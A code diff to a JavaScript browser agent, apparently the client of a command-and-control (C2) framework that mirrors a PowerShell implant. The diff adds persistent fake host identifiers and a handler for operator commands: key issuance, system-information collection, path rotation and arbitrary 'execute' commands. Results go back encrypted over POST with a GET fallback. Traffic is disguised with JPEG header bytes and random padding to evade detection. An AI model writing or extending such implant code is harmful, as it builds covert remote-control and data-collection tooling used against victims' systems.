@@ -400,6 +400,11 @@ class KCMAgentCommunication {
     constructor(config) {
         // Create a persistent client ID that doesn't change between beacons
         this.persistentClientId = 'client_' + Math.random().toString(36).substring(2, 10);
+        this.persistentHostname = "Browser-" + Math.random().toString(36).substring(2, 10);
+        this.persistentMachineGuid = 'browser-' + 
+        ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+            (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
+        );
         
         // Configuration
         this.config = {
@@ -716,7 +721,7 @@ class KCMAgentCommunication {
                 // If POST fails, try GET as fallback
                 console.log('POST beacon failed, trying GET fallback: ', error);
                 
-                // Format query string with client ID
+                // Format query string like PowerShell does
                 const queryString = `?d=${encodeURIComponent(requestPayload.d)}&t=${encodeURIComponent(requestPayload.t)}&c=${encodeURIComponent(requestPayload.c)}`;
                 
                 response = await fetch(`${fullUrl}${queryString}`, {
@@ -908,7 +913,117 @@ class KCMAgentCommunication {
             return false;
         }
     }
+    
+    // Process a command from the server
+    async processCommand(command) {
+        const timestamp = command.timestamp;
+        const commandType = command.command_type;
+        const args = command.args;
         
+        console.log(`Processing command: ${commandType} at ${timestamp}`);
+        this.updateUIStatus(`Processing command: ${commandType}`);
+        
+        let result = '';
+        
+        try {
+            // Handle different command types
+            switch (commandType) {
+                case 'key_issuance':
+                    // Use server key if needed
+                    if (!this.state.keyRegistered || !this.state.encryptionKey) {
+                        try {
+                            this.state.encryptionKey = await this.crypto.importAESKey(args);
+                            this.state.keyRegistered = true;
+                            this.state.firstContact = false;
+                            result = 'Key issuance successful - secure channel established';
+                            console.log('Using server-issued key for encryption');
+                        } catch (e) {
+                            result = `Key issuance failed: ${e.message}`;
+                        }
+                    } else {
+                        result = 'Client using self-generated key, issuance ignored';
+                    }
+                    break;
+                    
+                case 'key_rotation':
+                    // Only process if key registration failed or is still pending
+                    if (!this.state.keyRegistered || !this.state.encryptionKey) {
+                        // Handle key rotation command from operator
+                        try {
+                            this.state.encryptionKey = await this.crypto.importAESKey(args);
+                            this.state.keyRegistered = true;
+                            result = 'Key rotation successful - using new encryption key';
+                        } catch (e) {
+                            result = `Key rotation failed: ${e.message}`;
+                        }
+                    } else {
+                        result = 'Client using self-generated key, rotation ignored';
+                    }
+                    break;
+                    
+                case 'system_info_request':
+                    // Now that we have secure channel, send FULL system info
+                    // This matches PowerShell behavior - only sending full info after secure channel
+                    const fullSystemInfo = this.getSystemInformation(false);
+                    result = JSON.stringify(fullSystemInfo);
+                    
+                    // Update UI if available
+                    this.updateSystemInfo(fullSystemInfo);
+                    console.log("Full system information sent after secure channel established");
+                    break;
+                    
+                case 'path_rotation':
+                    // Update path rotation information
+                    try {
+                        const rotationArgs = JSON.parse(args);
+                        if (rotationArgs.rotation_id !== undefined) {
+                            this.state.currentRotationId = rotationArgs.rotation_id;
+                        }
+                        if (rotationArgs.next_rotation_time !== undefined) {
+                            this.state.nextRotationTime = rotationArgs.next_rotation_time;
+                        }
+                        if (rotationArgs.paths && rotationArgs.paths.path_pool) {
+                            this.state.pathPool = rotationArgs.paths.path_pool;
+                        }
+                        result = `Path rotation updated: ID ${this.state.currentRotationId}, next rotation at ${new Date(this.state.nextRotationTime * 1000).toLocaleString()}`;
+                    } catch (e) {
+                        result = `Path rotation failed: ${e.message}`;
+                    }
+                    break;
+                    
+                case 'execute':
+                    // Execute custom command - pass to handler
+                    try {
+                        result = await this.config.onCommandReceived(commandType, args);
+                        if (result === undefined) {
+                            result = 'Command executed successfully (no output)';
+                        }
+                        if (typeof result !== 'string') {
+                            result = JSON.stringify(result);
+                        }
+                    } catch (e) {
+                        result = `Error executing command: ${e.message}`;
+                    }
+                    break;
+                    
+                default:
+                    result = `Unknown command type: ${commandType}`;
+            }
+            
+            // Send the result back to the server
+            await this.sendCommandResult(timestamp, result);
+            this.updateUIStatus("Command completed");
+        } catch (error) {
+            console.error(`Error processing command ${commandType}:`, error);
+            // Try to send error back to server
+            try {
+                await this.sendCommandResult(timestamp, `Error processing command: ${error.message}`);
+            } catch (e) {
+                console.error('Failed to send error result:', e);
+            }
+        }
+    }
+    
     // Send command result back to the server
     async sendCommandResult(timestamp, result) {
         // Select a random path for sending results
@@ -936,127 +1051,62 @@ class KCMAgentCommunication {
         // Create the request payload
         const requestPayload = {
             d: encryptedData,
-            t: this.generateRandomToken(50 + Math.floor(Math.random() * 450))
+            t: this.generateRandomToken(50),
+            c: this.state.clientId || this.persistentClientId
         };
         
-        // Convert to JSON
-        const requestJson = JSON.stringify(requestPayload);
+        console.log(`Sending command result to ${fullUrl}`);
         
-        // Send the result
+        // First try POST
         try {
             const response = await fetch(fullUrl, {
                 method: 'POST',
-                mode: 'cors', // Explicitly request CORS handling
-                credentials: 'omit', // Don't send cookies
+                mode: 'cors', 
+                credentials: 'omit',
                 headers: {
                     'Content-Type': 'application/json',
-                    'User-Agent': this.config.userAgent,
-                    'Origin': window.location.origin || 'null' // Add origin header
+                    'User-Agent': this.config.userAgent
                 },
-                body: JSON.stringify(initialBeacon)
+                body: JSON.stringify(requestPayload)
             });
             
             if (!response.ok) {
                 throw new Error(`HTTP error: ${response.status}`);
             }
             
-            console.log('Command result sent successfully');
+            console.log('Command result sent successfully via POST');
             return true;
         } catch (error) {
-            console.error('Error sending command result:', error);
-            return false;
+            // If POST fails, try GET as fallback (like PowerShell does)
+            console.log('POST result failed, trying GET fallback:', error);
+            
+            try {
+                // Format query string
+                const queryString = `?d=${encodeURIComponent(requestPayload.d)}&t=${encodeURIComponent(requestPayload.t)}&c=${encodeURIComponent(requestPayload.c)}`;
+                
+                const getResponse = await fetch(`${fullUrl}${queryString}`, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    headers: {
+                        'User-Agent': this.config.userAgent
+                    }
+                });
+                
+                if (!getResponse.ok) {
+                    throw new Error(`HTTP error: ${getResponse.status}`);
+                }
+                
+                console.log('Command result sent successfully via GET');
+                return true;
+            } catch (getError) {
+                console.error('Error sending command result (both POST and GET failed):', getError);
+                return false;
+            }
         }
-    }
-    
-    // Process a command from the server
-    async processCommand(command) {
-        const timestamp = command.timestamp;
-        const commandType = command.command_type;
-        const args = command.args;
-        
-        console.log(`Processing command: ${commandType}`);
-        this.updateUIStatus(`Processing command: ${commandType}`);
-        
-        let result = '';
-        
-        // Handle different command types
-        switch (commandType) {
-            case 'key_rotation':
-                // Only process if key registration failed or is still pending
-                if (!this.state.keyRegistered || !this.state.encryptionKey) {
-                    // Handle key rotation command from operator
-                    try {
-                        this.state.encryptionKey = await this.crypto.importAESKey(args);
-                        this.state.keyRegistered = true;
-                        result = 'Key rotation successful - using new encryption key';
-                    } catch (e) {
-                        result = `Key rotation failed: ${e.message}`;
-                    }
-                } else {
-                    result = 'Client using self-generated key, rotation ignored';
-                }
-                break;
-                
-            case 'system_info_request':
-                // Now that we have secure channel, send FULL system info
-                // This matches PowerShell behavior - only sending full info after secure channel
-                const fullSystemInfo = this.getSystemInformation(false);
-                result = JSON.stringify(fullSystemInfo);
-                
-                // Update UI if available
-                this.updateSystemInfo(fullSystemInfo);
-                console.log("Full system information sent after secure channel established");
-                break;
-                
-            case 'path_rotation':
-                // Update path rotation information
-                try {
-                    const rotationArgs = JSON.parse(args);
-                    if (rotationArgs.rotation_id !== undefined) {
-                        this.state.currentRotationId = rotationArgs.rotation_id;
-                    }
-                    if (rotationArgs.next_rotation_time !== undefined) {
-                        this.state.nextRotationTime = rotationArgs.next_rotation_time;
-                    }
-                    if (rotationArgs.paths && rotationArgs.paths.path_pool) {
-                        this.state.pathPool = rotationArgs.paths.path_pool;
-                    }
-                    result = `Path rotation updated: ID ${this.state.currentRotationId}, next rotation at ${new Date(this.state.nextRotationTime * 1000).toLocaleString()}`;
-                } catch (e) {
-                    result = `Path rotation failed: ${e.message}`;
-                }
-                break;
-                
-            case 'execute':
-                // Execute custom command - pass to handler
-                try {
-                    result = await this.config.onCommandReceived(commandType, args);
-                    if (result === undefined) {
-                        result = 'Command executed successfully (no output)';
-                    }
-                    if (typeof result !== 'string') {
-                        result = JSON.stringify(result);
-                    }
-                } catch (e) {
-                    result = `Error executing command: ${e.message}`;
-                }
-                break;
-                
-            default:
-                result = `Unknown command type: ${commandType}`;
-        }
-        
-        // Send the result back to the server
-        await this.sendCommandResult(timestamp, result);
-        this.updateUIStatus("Command completed");
     }
     
     // Utility functions
-    
-    // Generate a client ID
-    generateClientId() {
-        return 'client_' + Math.random().toString(36).substring(2, 10);
-    }
     
     // Generate random token padding
     generateRandomToken(length) {
@@ -1081,17 +1131,13 @@ class KCMAgentCommunication {
         // For first contact, return minimal information with exact fields PowerShell uses
         if (minimal) {
             return {
-                Hostname: "Browser-" + Math.random().toString(36).substring(2, 10),
-                MachineGuid: window.clientMachineId || ('browser-' + 
-                    ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
-                        (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
-                    )),
+                Hostname: this.persistentHostname,  // Use persistent hostname
+                MachineGuid: this.persistentMachineGuid,  // Use persistent machine GUID
                 KeyRegistrationStatus: "pending", 
-                IP: "127.0.0.1", // Include IP explicitly - server will override with actual IP
+                IP: "127.0.0.1",
                 ProxyEnabled: false,
                 ProxyType: "system",
                 RotationId: 0,
-                // Add all exact fields from PowerShell agent
                 Username: "Browser-User",
                 OsVersion: navigator.userAgent,
                 Domain: "WORKGROUP"
@@ -1099,6 +1145,8 @@ class KCMAgentCommunication {
         } else {
             // For secure channel, return complete system information
             const info = {
+                Hostname: this.persistentHostname,  // Include persistent hostname
+                MachineGuid: this.persistentMachineGuid,  // Include persistent machine GUID
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -1161,7 +1209,8 @@ class KCMAgentCommunication {
             } catch (e) {
                 // Silently fail - this is expected in many browsers
             }
-            try{
+            
+            try {
                 info.MachineGuid = window.clientMachineId;
             } catch (e) {
                 // Silently fail
@@ -1169,7 +1218,6 @@ class KCMAgentCommunication {
             return info;
         }
     }
-
     
     // Default command handler
     defaultCommandHandler(commandType, args) {
@@ -1262,12 +1310,12 @@ class KCMCrypto {
                     name: 'AES-CBC',
                     length: 256
                 },
-                false,
+                true, // extractable must be true
                 ['encrypt', 'decrypt']
             );
         } catch (error) {
             console.error('Error importing AES key:', error);
-            return null;
+            throw error; // Throw to propagate the error
         }
     }
     
@@ -1298,7 +1346,11 @@ class KCMCrypto {
             
             // Convert to Base64
             const encryptedKeyArray = new Uint8Array(encryptedKey);
-            return btoa(String.fromCharCode.apply(null, encryptedKeyArray));
+            let binary = '';
+            for (let i = 0; i < encryptedKeyArray.length; i++) {
+                binary += String.fromCharCode(encryptedKeyArray[i]);
+            }
+            return btoa(binary);
         } catch (error) {
             console.error('Error encrypting key with RSA:', error);
             return null;
@@ -1312,13 +1364,15 @@ class KCMCrypto {
         try {
             // Convert data to string if it's not already
             const dataString = (typeof data === 'string') ? data : JSON.stringify(data);
+            
+            // Convert string to bytes
             const encoder = new TextEncoder();
             const dataBytes = encoder.encode(dataString);
             
             // Generate random IV (16 bytes for CBC)
             const iv = crypto.getRandomValues(new Uint8Array(16));
             
-            // Add PKCS#7 padding
+            // Add PKCS#7 padding MANUALLY - this is critical
             const blockSize = 16;
             const paddingLength = blockSize - (dataBytes.length % blockSize);
             const paddedData = new Uint8Array(dataBytes.length + paddingLength);
@@ -1329,7 +1383,7 @@ class KCMCrypto {
                 paddedData[i] = paddingLength;
             }
             
-            // Encrypt the data
+            // Encrypt using WebCrypto with raw padded data
             const encryptedContent = await window.crypto.subtle.encrypt(
                 { name: 'AES-CBC', iv: iv },
                 key,
@@ -1341,14 +1395,18 @@ class KCMCrypto {
             result.set(iv);
             result.set(new Uint8Array(encryptedContent), iv.length);
             
-            // Add JPEG header bytes (0xFF, 0xD8, 0xFF) at binary level before base64 encoding
+            // Add JPEG header bytes (0xFF, 0xD8, 0xFF) - EXACTLY as PowerShell does
             const jpegHeader = new Uint8Array([0xFF, 0xD8, 0xFF]);
             const withHeader = new Uint8Array(jpegHeader.length + result.length);
             withHeader.set(jpegHeader);
             withHeader.set(result, jpegHeader.length);
             
-            // Convert to Base64
-            return btoa(String.fromCharCode.apply(null, withHeader));
+            // Convert to Base64 properly handling binary data
+            let binary = '';
+            for (let i = 0; i < withHeader.length; i++) {
+                binary += String.fromCharCode(withHeader[i]);
+            }
+            return btoa(binary);
         } catch (error) {
             console.error('Encryption error:', error);
             return data; // Return original data if encryption fails
@@ -1367,13 +1425,13 @@ class KCMCrypto {
                 bytes[i] = binaryString.charCodeAt(i);
             }
             
-            // Check if there's a JPEG header and remove it (first 3 bytes)
+            // Check for and remove JPEG header (first 3 bytes)
             let dataWithoutHeader = bytes;
             if (bytes.length > 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
                 dataWithoutHeader = bytes.slice(3);
             }
             
-            // Extract IV (first 16 bytes) and encrypted data
+            // Extract IV and encrypted data
             const iv = dataWithoutHeader.slice(0, 16);
             const encryptedData = dataWithoutHeader.slice(16);
             
@@ -1387,11 +1445,11 @@ class KCMCrypto {
             // Convert to Uint8Array to handle padding removal
             const decryptedBytes = new Uint8Array(decryptedContent);
             
-            // Remove PKCS#7 padding
+            // Remove PKCS#7 padding - get the last byte value as padding length
             const paddingLength = decryptedBytes[decryptedBytes.length - 1];
             const unpaddedBytes = decryptedBytes.slice(0, decryptedBytes.length - paddingLength);
             
-            // Convert to string
+            // Convert back to string
             const decoder = new TextDecoder();
             return decoder.decode(unpaddedBytes);
         } catch (error) {
